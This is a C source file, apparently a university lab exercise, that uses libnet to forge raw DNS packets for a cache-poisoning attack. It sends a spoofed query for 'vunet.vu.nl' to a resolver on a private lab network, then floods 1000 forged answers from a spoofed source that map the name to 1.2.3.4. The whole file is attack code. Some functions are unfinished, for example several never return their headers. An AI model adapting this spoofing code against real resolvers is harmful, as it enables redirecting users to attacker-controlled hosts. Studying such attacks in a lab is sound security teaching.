#include <assert.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <stdint.h>


#include "attack.h"

void 						destroyLibnetContext(struct Libnet libnet);
uint16_t 					formatDNSQuestion(char* DNSQuestionBuffer, struct DNSQuestionFormatOptions options);
uint16_t 					formatDNSAnswer(struct DNSAnswerRecordFormatOptions options);
uint32_t 					makeByteNumberedIP(struct Libnet libnet, char* name, int resolve);
struct Libnet 				makeLibnet();
libnet_ptag_t 				makeIPHeader(struct IPv4HeaderOptions options);
libnet_ptag_t 				makeUDPHeader(struct UDPHeaderOptions options);
libnet_ptag_t 				makeDNSHeader(struct DNSHeaderOptions options);
struct DNSRequestHeaders	makeDNSRequestHeaders(struct DNSRequestHeadersOptions options);
struct DNSQueryRequest 		makeDNSQueryRequest(struct DNSRequestOptions options);
struct DNSQuestionRecord 	makeDNSQuestionRecord(struct DNSQuestionRecordOptions options);
struct DNSAnswerRecord 		makeDNSAnswerRecord(struct DNSAnswerRecordOptions options);
struct DNSAnswerRequest 	makeDNSAnswerRequest(struct DNSRequestOptions options);

void partOne(int argc, char* argv[]) {

}

void baitAndPoison(struct DNSRequestOptions options) {
	struct DNSQueryRequest QNameQuery = makeDNSQueryRequest(options);
	options.sourceIP = "192.168.10.30";
	options.base.destinationPort = 12000;
	options.base.sourcePort = 53;
	struct DNSAnswerRequest answerRequest = makeDNSAnswerRequest(options);
	libnet_write(QNameQuery.base.libnet.context);
	for(int i  = 0; i < 1000; i++){
		libnet_write(answerRequest.queryRequest.base.libnet.context);
	}
	destroyLibnetContext(QNameQuery.base.libnet);
}

int main(int argc, char* argv[]) {

	short part = parseOptions(argc, argv);
	struct DNSBaseRequestOptions baseRequestOptions;
	baseRequestOptions.queryID = 1000;
	baseRequestOptions.sourcePort = 17012;
	baseRequestOptions.destinationPort = 53;
	struct DNSRequestOptions bait;
	bait.qname = "vunet.vu.nl";
	bait.sourceIP = "192.168.10.20";
	bait.destinationIP = "192.168.10.10";
	bait.base = baseRequestOptions;
	baitAndPoison(bait);
	return 0;
}

struct DNSAnswerRecord makeDNSAnswerRecord(struct DNSAnswerRecordOptions options) {

	struct DNSAnswerRecord record;
	char answerBuffer[RECORD_BUFFER_SIZE] = { '\0' };
	struct DNSAnswerRecordFormatOptions answerFormatOptions = { options.libnet, answerBuffer, options };
	record.recordSize = formatDNSAnswer(answerFormatOptions);
	record.ptag = libnet_build_data(
		(uint8_t*)answerBuffer,
		(uint32_t)record.recordSize,
		options.libnet.context,
		options.ptag
	);
	if (record.ptag == -1) {
		fprintf(stderr, "Error: Could not create Answer Record.\n Libnet error: %s", libnet_geterror(options.libnet.context));
		exit(EXIT_FAILURE);
	}
	return record;

};

uint16_t formatDNSAnswer(struct DNSAnswerRecordFormatOptions options) {
	uint16_t recordLength = 0;
	char Type[sizeof(uint16_t)] = { '\0' }; uint16ToChars(Type, uint16tono16(options.answer.type));
	char Class[sizeof(uint16_t)] = { '\0' }; uint16ToChars(Class, uint16tono16(options.answer.class));
	char TTL[sizeof(uint32_t)] = { '\0' }; uint32ToChars(TTL, uint32tono32(options.answer.ttl));
	char RDLENGTH[sizeof(uint16_t)] = { '\0' }; uint16ToChars(RDLENGTH, uint16tono16(options.answer.rdlength));
	char rdataBuffer[sizeof(uint32_t)] = { '\0' };
	uint32_t noRdata = libnet_name2addr4(options.libnet.context, options.answer.rdata, LIBNET_DONT_RESOLVE);
	uint32ToChars(rdataBuffer, noRdata);

	recordLength = makeDomain(options.buffer, options.answer.qname);
	memcpy(options.buffer + recordLength, &Type, sizeof Type);
	recordLength += sizeof Type;
	memcpy(options.buffer + recordLength, &Class, sizeof Class);
	recordLength += sizeof Class;
	memcpy(options.buffer + recordLength, &TTL, sizeof TTL);
	recordLength += sizeof TTL;
	memcpy(options.buffer + recordLength, &RDLENGTH, sizeof RDLENGTH);
	recordLength += sizeof RDLENGTH;
	memcpy(options.buffer + recordLength, rdataBuffer, sizeof rdataBuffer);
	recordLength += sizeof rdataBuffer;

	for (int i = 0; i < recordLength; i++) {
		printf("0x%02X ", options.buffer[i]);
	}
	printf("\n");

	return recordLength;
}

libnet_ptag_t makeDNSHeader(struct DNSHeaderOptions options) {
	uint16_t FLAGS = options.flags; /*0x0100*/
	u_int16_t NUMBER_QUESTIONS = options.numberQuestions; /* 1 Might change in later parts.*/
	u_int16_t NUMBER_ANSWER_RR = options.numberAnswerResourceRecords;
	u_int16_t NUMBER_AUTHORITY_RR = options.authorityResourceRecord;
	u_int16_t NUMBER_ADDITIONAL_RR = 0;
	libnet_ptag_t PTAG = 0;
	PTAG = libnet_build_dnsv4(
		LIBNET_UDP_DNSV4_H,
		options.queryID,
		FLAGS,
		NUMBER_QUESTIONS,
		NUMBER_ANSWER_RR,
		NUMBER_AUTHORITY_RR,
		NUMBER_ADDITIONAL_RR,
		NULL_PAYLOAD,
		NULL_PAYLOAD_SIZE,
		options.libnet.context,
		PTAG
	);
	if (PTAG == -1) {
		fprintf(stderr, "Error: Could not create DNS header. \nLibnet Error: %s", libnet_geterror(options.libnet.context));
		exit(EXIT_FAILURE);
	}
	return PTAG;
}

struct DNSRequestHeaders makeDNSRequestHeaders(struct DNSRequestHeadersOptions options) {

	struct DNSRequestHeaders headers;
	struct UDPHeaderOptions UDPHeaderOptions = { options.libnet, options.recordsSize, options.base.sourcePort, options.base.destinationPort };
	struct IPv4HeaderOptions IPOptions = { options.libnet, options.recordsSize, options.base.networkOrderedIPs.source, options.base.networkOrderedIPs.destination };

	headers.DNSHeaderPtag = makeDNSHeader(options.dnsHeaderOptions);
	headers.UDPHeaderPtag = makeUDPHeader(UDPHeaderOptions);
	headers.IPv4HeaderPtag = makeIPHeader(IPOptions);

}



struct NetworkOrderedIPs parseIPs(struct Libnet libnet, char* sourceIPString, char* destinationIPString) {
	struct NetworkOrderedIPs ips;
	if (sourceIPString == NULL) {
		ips.source = libnet_get_ipaddr4(libnet.context);
	}
	else {
		ips.source = makeByteNumberedIP(libnet, sourceIPString, LIBNET_DONT_RESOLVE);
	}

	ips.destination = makeByteNumberedIP(libnet, destinationIPString, LIBNET_DONT_RESOLVE);
	return ips;
}

struct DNSAnswerRequest makeDNSAnswerRequest(struct DNSRequestOptions options){

	struct DNSAnswerRequest answerRequest;
	struct DNSQueryRequest queryRequest;
	queryRequest.base.libnet = makeLibnet();
	uint16_t qtype = 1, qclass = 1;
	options.base.networkOrderedIPs = parseIPs(queryRequest.base.libnet, options.sourceIP, options.destinationIP);


	struct DNSAnswerRecordOptions answerRecordOptions;
	answerRecordOptions.qname = options.qname;
	answerRecordOptions.type = 1;
	answerRecordOptions.class = 1;
	answerRecordOptions.ttl = 7200;
	answerRecordOptions.rdlength = 4;
	answerRecordOptions.rdata = "1.2.3.4";
	answerRecordOptions.ptag = 0;
	answerRecordOptions.libnet = queryRequest.base.libnet;
	struct DNSAnswerRecord answerRecord = makeDNSAnswerRecord(answerRecordOptions);

	struct DNSQuestionFormatOptions DNSQuestionFormatOptions = { options.qname, qtype, qclass };
	struct DNSQuestionRecordOptions DNSQuestionRecordOptions = { queryRequest.base.libnet, DNSQuestionFormatOptions };
	queryRequest.DNSQuestionRecord = makeDNSQuestionRecord(DNSQuestionRecordOptions);

	struct DNSRequestHeadersOptions requestHeadersOptions;
	struct DNSHeaderOptions dnsHeaderOptions = { queryRequest.base.libnet, queryRequest.DNSQuestionRecord.questionSize, options.base.queryID , 0b1000010000000000, 1, 1, 0};

	requestHeadersOptions.libnet = queryRequest.base.libnet;
	requestHeadersOptions.base = options.base;
	requestHeadersOptions.recordsSize = queryRequest.DNSQuestionRecord.questionSize + answerRecord.recordSize;
	requestHeadersOptions.dnsHeaderOptions = dnsHeaderOptions;

	queryRequest.base.headers = makeDNSRequestHeaders(requestHeadersOptions);
	answerRequest.answerRecord = answerRecord;
	answerRequest.queryRequest = queryRequest;
	return answerRequest;
}

struct DNSQueryRequest makeDNSQueryRequest(struct DNSRequestOptions options) {

	struct DNSQueryRequest query;
	query.base.libnet = makeLibnet();
	uint16_t qtype = 1, qclass = 1;

	options.base.networkOrderedIPs = parseIPs(query.base.libnet, options.sourceIP, options.destinationIP);

	struct DNSQuestionFormatOptions DNSQuestionFormatOptions = { options.qname, qtype, qclass };
	struct DNSQuestionRecordOptions DNSQuestionRecordOptions = { query.base.libnet, DNSQuestionFormatOptions };
	query.DNSQuestionRecord = makeDNSQuestionRecord(DNSQuestionRecordOptions);

	struct DNSRequestHeadersOptions requestHeadersOptions;
	struct DNSHeaderOptions dnsHeaderOptions = { query.base.libnet, query.DNSQuestionRecord.questionSize, options.base.queryID , 0x0100, 1, 0, 0};

	requestHeadersOptions.libnet = query.base.libnet;
	requestHeadersOptions.base = options.base;
	requestHeadersOptions.recordsSize = query.DNSQuestionRecord.questionSize;
	requestHeadersOptions.dnsHeaderOptions = dnsHeaderOptions;

	query.base.headers = makeDNSRequestHeaders(requestHeadersOptions);
	return query;
}

uint32_t makeByteNumberedIP(struct Libnet libnet, char* name, int resolve) {
	uint32_t byteOrderedIp;
	if ((byteOrderedIp = libnet_name2addr4(libnet.context, name, resolve)) == -1) {
		fprintf(stderr, "Error: Bad destination IP address.\n");
		exit(EXIT_FAILURE);
	}
	return byteOrderedIp;
}

uint16_t formatDNSQuestion(char* DNSQuestionBuffer, struct DNSQuestionFormatOptions options) {

	uint16_t questionSize = makeDomain(DNSQuestionBuffer, options.qname);
	char qtypeChar[2] = { '0' }; uint16ToChars(qtypeChar, uint16tono16(options.qtype));
	char qclassChar[2] = { '0' }; uint16ToChars(qclassChar, uint16tono16(options.qclass));;

	memcpy(DNSQuestionBuffer + questionSize, &qtypeChar, sizeof qtypeChar);
	questionSize += sizeof qtypeChar;
	memcpy(DNSQuestionBuffer + questionSize, &qclassChar, sizeof qclassChar);
	questionSize += sizeof qclassChar;
	return questionSize;

}

struct DNSQuestionRecord makeDNSQuestionRecord(struct DNSQuestionRecordOptions options) {
	char questionBuffer[RECORD_BUFFER_SIZE] = { '\0' };
	uint16_t questionSize = formatDNSQuestion(questionBuffer, options.formatOptions);
	libnet_ptag_t libnet_ptag = libnet_build_data(
		(uint8_t*)questionBuffer,
		questionSize,
		options.libnet.context,
		0
	);
	if (libnet_ptag == -1) {
		fprintf(stderr, "Error could not create DNS question record..\n Libnet Error: %s", libnet_geterror(options.libnet.context));
		exit(EXIT_FAILURE);
	}
	return (struct DNSQuestionRecord) { libnet_ptag, questionSize };
}

libnet_ptag_t makeUDPHeader(struct UDPHeaderOptions options) {
	uint16_t CHECKSUM = 0;
	uint16_t PTAG = 0;

	libnet_ptag_t libnet_ptag = libnet_build_udp(
		options.sourcePort,
		options.destinationPort,
		LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + options.resourceLength,
		CHECKSUM,
		NULL_PAYLOAD,
		NULL_PAYLOAD_SIZE,
		options.libnet.context,
		PTAG
	);
	if (libnet_ptag == -1) {
		fprintf(stderr, "Error could not create UDP header.\n Libnet Error: %s", libnet_geterror(options.libnet.context));
		exit(EXIT_FAILURE);
	}
}

libnet_ptag_t makeIPHeader(struct IPv4HeaderOptions options) {
	uint8_t TYPE_OF_SERVICE = 0;
	uint16_t ID = 0;
	uint16_t FRAGMENTATION = 0;
	uint8_t TTL = 64;
	uint8_t PROTOCOL = IPPROTO_UDP;
	uint16_t CHECKSUM = 0;
	libnet_ptag_t PTAG = 0;

	libnet_ptag_t libnet_ptag = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + options.resourceLength,
		TYPE_OF_SERVICE,
		ID,
		FRAGMENTATION,
		TTL,
		PROTOCOL,
		CHECKSUM,
		options.sourceIP,
		options.destinationIP,
		NULL_PAYLOAD,
		NULL_PAYLOAD_SIZE,
		options.libnet.context,
		PTAG
	);
	if (libnet_ptag == -1) {
		fprintf(stderr, "Error: Could not create IPv4 Header.\n Libnet Error: %s", libnet_geterror(options.libnet.context));
		exit(EXIT_FAILURE);
	}
	return libnet_ptag;
}

void parseArguments(int part, int argc, char* argv[]) {
	switch (part)
	{
	case 1:
		break;
	case 2:
		break;
	case 3:
		break;
	case 4:
		break;
	default:
		abort();
	}
}

struct Libnet makeLibnet() {
	struct Libnet libnet = { NULL, NULL };
	libnet.errorBuffer = calloc(LIBNET_ERRBUF_SIZE, sizeof(char));
	libnet.context = libnet_init(
		LIBNET_RAW4,
		"enp0s8",
		libnet.errorBuffer);

	if (!libnet.context) {
		fprintf(stderr, "Could not initiate libnet: %s\n", libnet.errorBuffer);
		exit(EXIT_FAILURE);
	}
	return libnet;
}

void destroyLibnetContext(struct Libnet libnet) {
	libnet_destroy(libnet.context);
	free(libnet.errorBuffer);
	return;
}

